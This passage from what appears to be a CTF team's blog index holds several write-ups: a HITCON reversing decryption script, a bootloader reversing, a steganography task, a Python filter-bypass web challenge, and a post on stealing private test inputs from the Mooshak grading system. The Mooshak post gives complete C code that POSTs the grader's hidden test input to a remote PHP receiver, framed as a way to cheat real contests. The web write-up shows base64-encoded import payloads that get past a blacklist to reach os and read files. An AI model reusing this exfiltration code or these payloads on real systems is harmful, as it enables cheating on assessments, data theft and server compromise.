0xBB, 0x92, 0x7B, 0x52, 0xD2, 0x3B, 0x52, 0x9F, 0x6B, 0x1E, 0x9F, 0x8E, 0x7F, 0x05, 0x8E, 0x98, 0xFD, 0x52, 0x98, 0x69, 0x74, 0x53, 0x69, 0xBC, 0x0A, 0xB9, 0xBC, 0x33, 0x3C, 0x2D, 0x33, 0xBA, 0xD5, 0x64, 0xBA, 0x78, 0x60, 0x48, 0x78, 0xB9, 0x0E, 0xBE, 0xB9, 0xA3, 0x5B, 0x3A, 0xA3, 0x3C, 0x30, 0x24, 0x3C, 0x0F, 0x0C, 0x09, 0x0F, 0x96, 0xB8, 0xCA, 0x96, 0xA1, 0xC9, 0x71, 0xA1, 0xBE, 0x98, 0xF2, 0xBE, 0xCA, 0x2F, 0x69, 0xCA, 0x2F, 0xB6, 0x74, 0x2F, 0x90, 0x67, 0x17, 0x90, 0xC4, 0x6A, 0xF1, 0xC4, 0xCC, 0xF0, 0xB4, 0xCC, 0xFA, 0xC8, 0x9E, 0xFA, 0x10, 0x5D, 0x8A, 0x10, 0x9C, 0xB0, 0xC4, 0x9C, 0xE9, 0x4E, 0xCE, 0xE9, 0x9B, 0x26, 0x88, 0x9B, 0x9A, 0x6F, 0x19, 0x9A, 0x13, 0x86, 0x50, 0x13, 0x4E, 0x58, 0x62, 0x4E, 0xA7, 0x16, 0xAC, 0xA7, 0x16, 0x82, 0x57, 0x16, 0xB3, 0x06, 0xB0, 0xB3]# Rotate left: 0b1001 --&gt; 0b0011rol = lambda val, r_bits, max_bits: \\ (val &lt;&lt; r_bits % max_bits) &amp; (2**max_bits - 1) | \\ ((val &amp; (2**max_bits - 1)) &gt;&gt; (max_bits - (r_bits % max_bits)))# Rotate right: 0b1001 --&gt; 0b1100ror = lambda val, r_bits, max_bits: \\ ((val &amp; (2**max_bits - 1)) &gt;&gt; r_bits % max_bits) | \\ (val &lt;&lt; (max_bits - (r_bits % max_bits)) &amp; (2**max_bits - 1))def access_offstream(offset, index): return array_of_ints_to_int(offset[index:index + 4][::-1])def array_of_ints_to_int(a): return int(''.join(pack('!B', x) for x in a).encode('hex'), 16)def shr_add_xor(dword, offset, shifts, adds=[0, 0, 0, 0], muls=[1, 1, 1, 1]): edx = ((dword &gt;&gt; shifts[0] &amp; 0xff) + adds[0]) * muls[0] a = array_of_ints_to_int(offset[edx:edx + 4][::-1]) edx = ((dword &gt;&gt; shifts[1] &amp; 0xff) + adds[1]) * muls[1] b = array_of_ints_to_int(offset[edx:edx + 4][::-1]) c = a ^ b edx = ((dword &gt;&gt; shifts[2] &amp; 0xff) + adds[2]) * muls[2] d = array_of_ints_to_int(offset[edx:edx + 4][::-1]) e = d ^ c edx = ((dword &gt;&gt; shifts[3] &amp; 0xff) + adds[3]) * muls[3] f = array_of_ints_to_int(offset[edx:edx + 4][::-1]) g = f ^ e return a, b, c, d, f, gdef sum_sum_xor(dword0, dword1, dword3, offset, offset_index): sum1 = (dword0 + dword1) &amp; 0xffffffff sum2 = ( sum1 + array_of_ints_to_int(offset[offset_index:offset_index + 4][::-1])) &amp; 0xffffffff return sum2 ^ dword3encrypted_flag = [0x4F, 0x6F, 0xA7, 0x87, 0xE9, 0x51, 0x87, 0x64, 0x38, 0x2A, 0x46, 0xE5, 0x4F, 0x21, 0x9E, 0x1C, 0xCD, 0x65, 0xE1, 0x9A, 0x4F, 0xCF, 0xDE, 0x52, 0x09, 0xBF, 0x53, 0xC4, 0xB0, 0x95, 0x75, 0x31, 0xAC, 0x2F, 0xF4, 0x97, 0x1D, 0xA5, 0x9A, 0x02, 0xA8, 0xFF, 0xAE, 0x2E, 0xB9, 0x70, 0xCC, 0x02]xor_keys_input0 = [0] * 0x8xor_keys_input1 = [0] * 0x8for x in range(len(encrypted_flag)): if (x % 16) &lt; 8: xor_keys_input0.append(encrypted_flag[x]) else: xor_keys_input1.append(encrypted_flag[x])flag = ''for x in range(0, 16 * 3, 16): test = encrypted_flag[x:16 + x] dword_560CC63C71B0 = test[:8][::-1] dword_560CC63C71B8 = test[8:][::-1] dword_560CC63C71C0 = array_of_ints_to_int(dword_560CC63C71B8[-4:]) dword_560CC63C71C4 = array_of_ints_to_int(dword_560CC63C71B8[:4]) dword_560CC63C71C8 = array_of_ints_to_int(dword_560CC63C71B0[-4:]) dword_560CC63C71CC = array_of_ints_to_int(dword_560CC63C71B0[:4]) dword_560CC63C71C8 = dword_560CC63C71C8 ^ access_offstream( off_560CC63C7150, 0x10) dword_560CC63C71CC = dword_560CC63C71CC ^ access_offstream( off_560CC63C7150, 0x14) dword_560CC63C71C0 = dword_560CC63C71C0 ^ access_offstream( off_560CC63C7150, 0x18) dword_560CC63C71C4 = dword_560CC63C71C4 ^ access_offstream( off_560CC63C7150, 0x1c) for i in range(16 * 7, -16, -16): dword_560CC63C71D0 = shr_add_xor(dword_560CC63C71C8, off_560CC63C7150, [ 0, 8, 0x10, 0x18], [0x40, 0x140, 0x240, 0x340], [4, 4, 4, 4])[-1] dword_560CC63C71D4 = shr_add_xor(dword_560CC63C71CC, off_560CC63C7150, [ 0x18, 0, 0x8, 0x10], [0x40, 0x140, 0x240, 0x340], [4, 4, 4, 4])[-1] edx = dword_560CC63C71D0 + \\ (dword_560CC63C71D4 + dword_560CC63C71D4) &amp; 0xffffffff eax = (array_of_ints_to_int(off_560CC63C7150[ 0x2c + i:0x2c + 4 + i][::-1]) + edx) &amp; 0xffffffff dword_560CC63C71C4 = dword_560CC63C71C4 ^ eax dword_560CC63C71C4 = ror(dword_560CC63C71C4, 1, max_bits) dword_560CC63C71C0 = rol(dword_560CC63C71C0, 1, max_bits) dword_560CC63C71C0 = sum_sum_xor( dword_560CC63C71D0, dword_560CC63C71D4, dword_560CC63C71C0, off_560CC63C7150, 0x28 + i) dword_560CC63C71D0 = shr_add_xor(dword_560CC63C71C0, off_560CC63C7150, [ 0, 8, 0x10, 0x18], [0x40, 0x140, 0x240, 0x340], [4, 4, 4, 4])[-1] dword_560CC63C71D4 = shr_add_xor(dword_560CC63C71C4, off_560CC63C7150, [ 0x18, 0, 0x8, 0x10], [0x40, 0x140, 0x240, 0x340], [4, 4, 4, 4])[-1] edx = dword_560CC63C71D0 + \\ ((dword_560CC63C71D4 + dword_560CC63C71D4) &amp; 0xffffffff) eax = (array_of_ints_to_int(off_560CC63C7150[ 0x24 + i:0x24 + 4 + i][::-1]) + edx) &amp; 0xffffffff dword_560CC63C71CC = dword_560CC63C71CC ^ eax dword_560CC63C71CC = ror(dword_560CC63C71CC, 1, max_bits) dword_560CC63C71C8 = rol(dword_560CC63C71C8, 1, max_bits) dword_560CC63C71C8 = sum_sum_xor( dword_560CC63C71D0, dword_560CC63C71D4, dword_560CC63C71C8, off_560CC63C7150, 0x20 + i) dwords_flaginput = [dword_560CC63C71C8, dword_560CC63C71CC] dwords_flaginput2 = [dword_560CC63C71C0, dword_560CC63C71C4] k = 0 s = '' for i in range(0, 8, 4): s += pack(\"&lt;I\", dwords_flaginput2[k] ^ access_offstream(off_560CC63C7150, i)) k += 1 s = pack(\"&gt;Q\", int(s.encode('hex'), 16) ^ array_of_ints_to_int(xor_keys_input0[x / 2:x / 2 + 8])) s1 = '' k = 0 for i in range(8, 8 * 2, 4): s1 += pack(\"&lt;I\", dwords_flaginput[k] ^ access_offstream(off_560CC63C7150, i)) k += 1 s1 = pack(\"&gt;Q\", int(s1.encode('hex'), 16) ^ array_of_ints_to_int(xor_keys_input1[x / 2:x / 2 + 8])) flag += s + s1print \"hitcon&#123;\"+flag+\"&#125;\" Running it to get the flag : 12$ python reverselukaku.py hitcon&#123;~Exc3p7i0n-Ori3n7ed-Pr0grammin9~RoO0cks!!\\o^_^o/&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"ida","slug":"ida","permalink":"https://teamrocketist.github.io/tags/ida/"},{"name":"exceptions","slug":"exceptions","permalink":"https://teamrocketist.github.io/tags/exceptions/"},{"name":"hitcon2018","slug":"hitcon2018","permalink":"https://teamrocketist.github.io/tags/hitcon2018/"}]},{"title":"[Web] Mooshak - Stealing private tests from mooshak","slug":"Web-Mooshak-Stealing-private-tests-from-mooshak","date":"2018-10-14T20:01:50.000Z","updated":"2018-10-24T23:21:04.838Z","comments":true,"path":"2018/10/14/Web-Mooshak-Stealing-private-tests-from-mooshak/","link":"","permalink":"https://teamrocketist.github.io/2018/10/14/Web-Mooshak-Stealing-private-tests-from-mooshak/","excerpt":"","text":"A long time ago in a secret meme group far far away I did find this: This meme made me giggle straight way, not because of the meme itself but the message “If we only could do this”, back in the day I already how to do it but never tested it out in a live server for obvious reasons and lets make it clear IST projects nowadays are so easy we don’t really need have to cheat. Finally decided to do a write up about this, I downloaded mooshak and installed on a VM machine and created a c contest. I don’t really consider this an attack or a hack, if we were talking about games we could easily say this was “clever use of game mechanics”, as you know most of the project contests in IST have this basic idea to run tests: 12Input -&gt; Receives the input of a specific test into your program.Output -&gt; Compares the output of your project and server output (this is what determines whether you passed or not a test). As we know we are going to read the input into memory, since we can control the code and what is running, we just need to find a way to sent the information out to ourselves, one way to do this is by using GET or POST requests: The GET request has a limit of 8192 bytes so in a bigger input test you won’t be able to send the entire test so I recommend to use a POST , writing the code necessary in c to do this is quite challenging but in another languages like python, lisp or even prolog is quite simple, speaking about the endpoint that are going to receive our requests you either write in php or any other language. The test.c file: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255#define _DEFAULT_SOURCE#include &lt;stdio.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;stdlib.h&gt;#include &lt;netdb.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt; #include &lt;ctype.h&gt;int create_tcp_socket();char *get_ip(char *host);char *build_get_query(char *host, char *page);void usage();char *join_strings();int http_request(int argc, char **argv, char* path, char* method);char *build_post_query(char *host, char *page, char* post_data); #define HOST \"127.0.0.1\"#define PAGE \"/wtf.php\"#define PORT 80#define USERAGENT \"HTMLGET 1.0\"char *url_encode(char *str);/* GET request limit is 8192 bytes we could try a post request but would be to heavy to ther server with 1 million nodes*/int main(int argc, char **argv) &#123; char *str; char c; int i = 0; int size = 16; http_request(3, argv, url_encode(\"---------------\"), \"post\"); str = (char*) malloc(sizeof(char)*size + 1); while ((c = getchar()) != EOF) &#123; str[i++]=c; if (i == size) &#123; str = realloc(str, sizeof(char)*(size+=16)); &#125; &#125; str[i++]='\\0'; http_request(3, argv, url_encode(str), \"post\"); free(str); return 0;&#125;/* Converts a hex character to its integer value */char from_hex(char ch) &#123; return isdigit(ch) ? ch - '0' : tolower(ch) - 'a' + 10;&#125;/* Converts an integer value to its hex character*/char to_hex(char code) &#123; static char hex[] = \"0123456789abcdef\"; return hex[code &amp; 15];&#125;/* Returns a url-encoded version of str *//* IMPORTANT: be sure to free() the returned string after use */char *url_encode(char *str) &#123; char *pstr = str, *buf = malloc(strlen(str) * 3 + 1), *pbuf = buf; while (*pstr) &#123; if (isalnum(*pstr) || *pstr == '-' || *pstr == '_' || *pstr == '.' || *pstr == '~') *pbuf++ = *pstr; else if (*pstr == ' ') *pbuf++ = '+'; else *pbuf++ = '%', *pbuf++ = to_hex(*pstr &gt;&gt; 4), *pbuf++ = to_hex(*pstr &amp; 15); pstr++; &#125; *pbuf = '\\0'; return buf;&#125;/* Returns a url-decoded version of str *//* IMPORTANT: be sure to free() the returned string after use */char *url_decode(char *str) &#123; char *pstr = str, *buf = malloc(strlen(str) + 1), *pbuf = buf; while (*pstr) &#123; if (*pstr == '%') &#123; if (pstr[1] &amp;&amp; pstr[2]) &#123; *pbuf++ = from_hex(pstr[1]) &lt;&lt; 4 | from_hex(pstr[2]); pstr += 2; &#125; &#125; else if (*pstr == '+') &#123; *pbuf++ = ' '; &#125; else &#123; *pbuf++ = *pstr; &#125; pstr++; &#125; *pbuf = '\\0'; return buf;&#125;int http_request(int argc, char **argv, char* path, char* method) &#123; struct sockaddr_in *remote; int sock; int tmpres; char *ip; char *get; char buf[BUFSIZ+1]; /*char webpage[1000];*/ char *host = HOST; char *page; int sent = 0; int htmlstart = 0; char * htmlcontent; if(argc == 1)&#123; usage(); exit(2); &#125; host = HOST; if (strcmp(\"get\", method) == 0) page = join_strings(PAGE, url_encode(path)); else page = PAGE; sock = create_tcp_socket(); ip = get_ip(host); fprintf(stderr, \"IP is %s\\n\", ip); remote = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in *)); remote-&gt;sin_family = AF_INET; tmpres = inet_pton(AF_INET, ip, (void *)(&amp;(remote-&gt;sin_addr.s_addr))); if( tmpres &lt; 0) &#123; exit(1); &#125; else if(tmpres == 0) &#123; fprintf(stderr, \"%s is not a valid IP address\\n\", ip); exit(1); &#125; remote-&gt;sin_port = htons(PORT); if(connect(sock, (struct sockaddr *)remote, sizeof(struct sockaddr)) &lt; 0)&#123; exit(1); &#125; if (strcmp(method, \"get\") == 0) get = build_get_query(host, page); else get = build_post_query(host, page, path); fprintf(stderr, \"Query is:\\n&lt;&lt;START&gt;&gt;\\n%s&lt;&lt;END&gt;&gt;\\n\", get); /*Send the query to the server*/ sent = 0; while(sent &lt; strlen(get)) &#123; tmpres = send(sock, get+sent, strlen(get)-sent, 0); if(tmpres == -1) &#123; exit(1); &#125; sent += tmpres; &#125; /*now it is time to receive the page*/ memset(buf, 0, sizeof(buf)); htmlstart = 0; while((tmpres = recv(sock, buf, BUFSIZ, 0)) &gt; 0) &#123; if(htmlstart == 0) &#123; /* Under certain conditions this will not work. * If the \\r\\n\\r\\n part is splitted into two messages * it will fail to detect the beginning of HTML content */ htmlcontent = strstr(buf, \"\\r\\n\\r\\n\"); if(htmlcontent != NULL) &#123; htmlstart = 1; htmlcontent += 4; &#125; &#125; else &#123; htmlcontent = buf; &#125; if(htmlstart) &#123; fprintf(stdout, htmlcontent); &#125; memset(buf, 0, tmpres); &#125; free(get); free(remote); free(ip); close(sock); return 0;&#125;void usage() &#123; fprintf(stderr, \"USAGE: htmlget host [page]\\n\\\\thost: the website hostname. ex: coding.debuntu.org\\n\\\\tpage: the page to retrieve. ex: index.html, default: /\\n\");&#125; int create_tcp_socket() &#123; int sock; if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) &#123; exit(1); &#125; return sock;&#125; char *get_ip(char *host) &#123; struct hostent *hent; int iplen = 15; /*XXX.XXX.XXX.XXX*/ char *ip = (char *)malloc(iplen+1); memset(ip, 0, iplen+1); if((hent = gethostbyname(host)) == NULL) &#123; exit(1); &#125; if(inet_ntop(AF_INET, (void *)hent-&gt;h_addr_list[0], ip, iplen) == NULL) &#123; exit(1); &#125; return ip;&#125; char *build_get_query(char *host, char *page) &#123; char *query; char *getpage = page; char *tpl = \"GET /%s HTTP/1.0\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\n\\r\\n\"; if(getpage[0] == '/') &#123; getpage = getpage + 1; fprintf(stderr,\"Removing leading \\\"/\\\", converting %s to %s\\n\", page, getpage); &#125; /* -5 is to consider the %s %s %s in tpl and the ending \\0 */ query = (char *)malloc(strlen(host)+strlen(getpage)+strlen(USERAGENT)+strlen(tpl)-5); sprintf(query, tpl, getpage, host, USERAGENT); return query;&#125;char *build_post_query(char *host, char *page, char *post_data) &#123; char *query; char *getpage = page; char* url_encoded = url_encode(post_data); int length_data = strlen(url_encoded)+1; char *tpl = \"POST /%s HTTP/1.0\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: %d\\r\\n\\r\\nfield1=%s\\r\\n\"; if(getpage[0] == '/') &#123; getpage = getpage + 1; fprintf(stderr,\"Removing leading \\\"/\\\", converting %s to %s\\n\", page, getpage); &#125; /* -5 is to consider the %s %s %s in tpl and the ending \\0 */ query = (char *)malloc(strlen(host)+strlen(getpage)+strlen(USERAGENT)+ strlen(tpl) + strlen(url_encoded) + 33 - 7); sprintf(query, tpl, getpage, host, USERAGENT, length_data+1, url_encoded); return query;&#125;char *join_strings(char *one, char *two) &#123; char *tpl = \"%s%s\"; char *query; query = (char *)malloc(strlen(one)+strlen(two)+1); sprintf(query, tpl, one, two); return query;&#125; And the php file (named as wtf.php in this example) 12345&lt;?phpif( isset($_POST['field1']) ) &#123; file_put_contents(\"input.txt\", urldecode($_POST['field1']));&#125;?&gt; As you can see above this is just a php script which writes the output from POST parameter into a file named input.txt that you need to create on your server too.So lets test this: 123456789101112131415161718192021222324252627282930313233$ gcc -O3 -ansi -Wall test.c -lm -o test$ cat input1 12 13 12 41 4$ ./test &lt; input./test &lt; input IP is 127.0.0.1Removing leading \"/\", converting /wtf.php to wtf.phpQuery is:&lt;&lt;START&gt;&gt;POST /wtf.php HTTP/1.0Host: 127.0.0.1User-Agent: HTMLGET 1.0Content-Type: application/x-www-form-urlencodedContent-Length: 17field1=---------------&lt;&lt;END&gt;&gt;IP is 127.0.0.1Removing leading \"/\", converting /wtf.php to wtf.phpQuery is:&lt;&lt;START&gt;&gt;POST /wtf.php HTTP/1.0Host: 127.0.0.1User-Agent: HTMLGET 1.0Content-Type: application/x-www-form-urlencodedContent-Length: 57field1=1%2b1%250a2%2b1%250a3%2b1%250a2%2b4%250a1%2b4%250a%250a&lt;&lt;END&gt;&gt; And now checking the server files: 12345678910$ pwd/var/www/html$ lsindex.cgi input.txt wtf.php$ cat input.txt 1 12 13 12 41 4 And we can see it works perfectly like this you can steal any private test input from mooshak. You may be asking if there is a way to get the output as well and the answer for now is actually no, but I’m currently researching a way to do this and I can say I’m very near to actually do it and if successful I can not only get the test outputs but the other user project submissions as well, the process to do this is an actual hack which involves privilege escalation so stay tuned for more posts. If you liked this post please follow us in twitter and consider joining our CTF team.","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"mooshak","slug":"mooshak","permalink":"https://teamrocketist.github.io/tags/mooshak/"}]},{"title":"[Reverse] InCTF 2018 - load3r","slug":"Reverse-InCTF-2018-load3r","date":"2018-10-11T03:56:04.000Z","updated":"2018-10-24T23:21:04.822Z","comments":true,"path":"2018/10/11/Reverse-InCTF-2018-load3r/","link":"","permalink":"https://teamrocketist.github.io/2018/10/11/Reverse-InCTF-2018-load3r/","excerpt":"","text":"load3r100======= Difficulty level : Easy ========A basic bootloader challenge. Note: The flag format is inctf{correct_input}Note: The challenge must be run in qemu-system-i386 version 2.5.0========== Authors : b3y0nd3r, r00tus3r ========== They gave us a file named boot sector12$ file boot_try.bin boot_try.bin: DOS/MBR boot sector So lets first run the binary on an emulator named qemu: 1$ qemu-system-i386 -drive format=raw,file=boot_try.bin We can see some strings like ENTER THE FLAG and the message NOOOO when we insert an incorrect flag, this strings can help us to localize certain parts of the code while reversing, so first thing I did was to look up for this strings in IDA and search on which zones they are referenced. At first I was having some trouble with IDA because I was choosing the wrong architecture when opening the binary and IDA wasn’t able to disassemble the code, the only thing that was showing was the strings so make sure you say no to disassemble the binary in 16 bits instead of the 32 bits. After pressing no, we can already see where is the location of the strings we saw when executing the binary… So we can start taking some notes from where they start in the binary (note that since the boot sector hasn’t been loaded into memory by the bios, all the addresses are starting from 0 but when we start debugging it everything will start after 0x7c00): 123450x7c16 ENTER THE FLAG\\r\\n -&gt; calculated with 0x7c00 + 0x160x7c27 w2g1kS&lt;c7me3keeuSMg1kSk%Se&lt;=S3%/e/\\r\\n -&gt; calculated with 0x7c00 + 0x270x7c4c Yeah, that is the flag\\r\\n -&gt; calculated with 0x7c00 + 0x4c0x7c65 8 7 NOOOO\\r\\n -&gt; calculated with 0x7c00 + 0x650x7cc9 37 36 0100010011011101111111011010110101\\r\\n -&gt; calculated with 0x7c00 + 0xc9 Now we have 2 subroutines to analyse, lets start by the smallest one: IDA’s comments are very explanatory, this is a function that writes a character into the screen by performing an interruption, so we can just rename this function to print since will be easier to us to identify it when it is called again. From the image above we can already assume that the flag must have 34 characters if we insert something that doesn’t have that size we go directly to printing the wrong flag message NOOO. But if we instead give a 34 character string we go through the green flow The image above is a loop, which iterates all the characters we inserted in the program, after doing the shifts we enter into the final character modification: We need to reverse this encryption function by doing exactly the opposite: Example12345encryption function -&gt; lr_string = &apos;0&apos;flag_string = &apos;T&apos;for the first character (shift right because the 1st of lr_string is zero):chr((ord(&apos;T&apos;) &gt;&gt; 1 ) ^ 5) = / 12345reverse function -&gt; lr_string = &apos;0&apos;encryption_string = &apos;/&apos;for the first character (shift left because we are reversing it and before we shift righted):chr((ord(&apos;/&apos;) ^ 5) &lt;&lt; 1) = T Of course it’s much easier to understand all this assembly while debugging and analysing the code… the way I did it was opening gdb and running this commands inside of it, after the commands bellow is just a matter of putting more breakpoints and reading registers etc etc: 123target remote | qemu-system-i386 -S -gdb stdio -m 512 -hda boot_try.binset architecture i8086b *0x7c00 We have now everything to recover the flag it’s trivial to write a python script that recovers the flag for us: 12345678910111213import stringleft_or_right = '0100010011011101111111011010110101'enc = \"\\x77\\x32\\x67\\x31\\x6B\\x53\\x3C\\x63\\x37\\x6D\\x65\\x33\\x6B\\x65\\x65\\x75\\x53\\x4D\\x67\\x31\\x6B\\x53\\x6B\\x25\\x53\\x65\\x3C\\x3D\\x53\\x33\\x25\\x2F\\x65\\x2F\"flag = \"\"for i, c in enumerate(enc[::-1]): a = ord(c) ^ 5 if left_or_right[i] == '0': flag += chr(a &lt;&lt; 1) else: flag += chr(a &gt;&gt; 1)print 'inctf&#123;'+flag+'&#125;' Running it 12$ python final.pyinctf&#123;T0T@l+pr0+@7+7h1$+8007l04d3r+7h1n9&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"InCTF2018","slug":"InCTF2018","permalink":"https://teamrocketist.github.io/tags/InCTF2018/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"qemu","slug":"qemu","permalink":"https://teamrocketist.github.io/tags/qemu/"},{"name":"i386","slug":"i386","permalink":"https://teamrocketist.github.io/tags/i386/"},{"name":"mbr","slug":"mbr","permalink":"https://teamrocketist.github.io/tags/mbr/"},{"name":"boot_sector","slug":"boot-sector","permalink":"https://teamrocketist.github.io/tags/boot-sector/"}]},{"title":"[Forensics] InCTF 2018 - Winter Sport","slug":"Forensics-InCTF-2018-Winter-Sport","date":"2018-10-09T21:00:56.000Z","updated":"2018-10-24T23:21:04.822Z","comments":true,"path":"2018/10/09/Forensics-InCTF-2018-Winter-Sport/","link":"","permalink":"https://teamrocketist.github.io/2018/10/09/Forensics-InCTF-2018-Winter-Sport/","excerpt":"","text":"Winter Sport996======= Difficulty level : Easy ========I have a friend named Jake.We were watching a football tournament on one fine chilly morning. Meanwhile Jake’s sister Susan did something mischievous which cause Jake to lose some really important data. We could only find this piece of evidence, can you recover it for him?========== Authors : cr4ck3t, stuxn3t ========== In this challenge, it is provided a zip file containing a pdf file.pdf where it is possible to find the following message. Besides this clear message, after running binwalk, we can find that there is another 7z archive. After extracting this 7z archive it is revealed another pdf, omg.pdf, containing the following characters, Well at first by opening the pdf in a text editor, we saw the composition of the pdf /ProcSet [/PDF /Text /ImageB /ImageC], saying that it contains 2 images although the pdf seemed to be corrupted, since we tried to extract the images from this pdf and there were some errors (some endstreams were missing and some other stuff regarding the pdf structure file). After we found what it seemed to be the encoding for those characters from the image above and they would translate into “What is Steganography ?Steganography is an amaz” but nothing more than that.Since we couldn’t find a clear way, we were going to fix the pdf anatomically speaking, and then we saw this. Well a bunch os spaces and tabs, just on the first 13 lines of the pdf? Due to Sublime Text (where tabs -&gt; “-“ and spaces -&gt; “.”) the idea of being another morse code related challenge, but well how could we find the spaces? what if we were using other text editor? Other options that came to our mind was Whitespace) and due to the message “What is Steganography ?Steganography is an amaz” we searched for steganography whitespace and we found Stegsnow which “is a program for concealing messages in text files by appending tabs and spaces on the end of lines, and for extracting messages from files containing hidden messages“. That was exactly what we wanted. Running it on the given omg.pdf it gave us the flag. Flag: inctf{w3lcom3_t0_7h3_w0rld_0f_whit3sp4c3}","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"steganography","slug":"steganography","permalink":"https://teamrocketist.github.io/tags/steganography/"},{"name":"whitespace_steganography","slug":"whitespace-steganography","permalink":"https://teamrocketist.github.io/tags/whitespace-steganography/"},{"name":"InCTF2018","slug":"InCTF2018","permalink":"https://teamrocketist.github.io/tags/InCTF2018/"}]},{"title":"[Web] InCTF 2018 - The Most Secure File Uploader","slug":"Web-InCTF-2018-The-Most-Secure-File-Uploader","date":"2018-10-08T00:09:56.000Z","updated":"2018-10-24T23:21:04.842Z","comments":true,"path":"2018/10/08/Web-InCTF-2018-The-Most-Secure-File-Uploader/","link":"","permalink":"https://teamrocketist.github.io/2018/10/08/Web-InCTF-2018-The-Most-Secure-File-Uploader/","excerpt":"","text":"The Most Secure File Uploader100======= Difficulty level : Medium ========Somehow the codes are all messed up and it seems that it was my younger brother. He messed up my File Uploader. But I know you…You don’t look like a hacker at all…Can you fix this for me? :)link========== Authors : c3rb3ru5, Nimisha, SpyD3r ========== After a long pause we are happy to announce that we are doing CTFs again so more write ups coming soon this month :). Starting with something simple we have a web challenge where it’s hinted that we probably need to upload something malicious to the server, for the begining I decided to upload a random image without nothing special: And we can already see something interesting, we have a traceback error and we can easily identify it as being from python, the file name is being executed as python code, after some testing I noticed that a lot of words were blacklisted: 1blacklisted = r\"import|os|class|subclasses|mro|request|args|eval|if|for|\\%|subprocess|file|open|popen|builtins|\\+|compile|execfile|from_pyfile|config|local|\\`|\\||\\&amp;|\\;|\\&#123;|\\&#125;\" As we know blacklisting is always a bad practice after testing for a while I noticed that globals() wasn’t being blocked and from globals we can easily can get the builtin function from python : 123456$ python -c \"print globals()\"&#123;'__builtins__': &lt;module '__builtin__' (built-in)&gt;, '__name__': '__main__', '__doc__': None, '__package__': None&#125;$ python -c \"print globals().values()[0]\"&lt;module '__builtin__' (built-in)&gt;$ python -c \"print dir(globals().values()[0])\"['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BufferError', 'BytesWarning', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'NameError', 'None', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '__debug__', '__doc__', '__import__', '__name__', '__package__', 'abs', 'all', 'any', 'apply', 'basestring', 'bin', 'bool', 'buffer', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'cmp', 'coerce', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'execfile', 'exit', 'file', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'intern', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'long', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'raw_input', 'reduce', 'reload', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'unichr', 'unicode', 'vars', 'xrange', 'zip'] But we run into a problem now a lot of words are blacklisted and there is an interesting builtin function we can use to list the files in the current directory , the problem is both import and os keywords are blacklisted so how do we bypass this? My solution was to find a way to execute function and import modules (dict[‘function’]) with strings and why strings? Because we can bypass this keywords by just using some kind of encoding in my case I choose to use base64: 12345$ python -c \"print globals().values()[0].__dict__['__import__']('os')\" # gets caught by the filter&lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt;python -c \"print globals().values()[0].__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))\" #bypasses the filter&lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt; Another thing we need to worry about is about the extension of the file, the filename needs to end in a valid image format like .jpg, this will cause an error because python methods don’t have a valid attribute named .jpg for example but we can easily bypass this by using a python comment #.jpg: 12python -c \"print globals().values()[0].__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))#.jpg\" &lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt; Now if we want to list the current directory with os.listdir(‘.’) we just need to complete our script: We now know that there is a file with the name of flag we just need to read it with open and read() : 12print globals().values()[0].__dict__['open']('flag','r').read()#.jpgprint 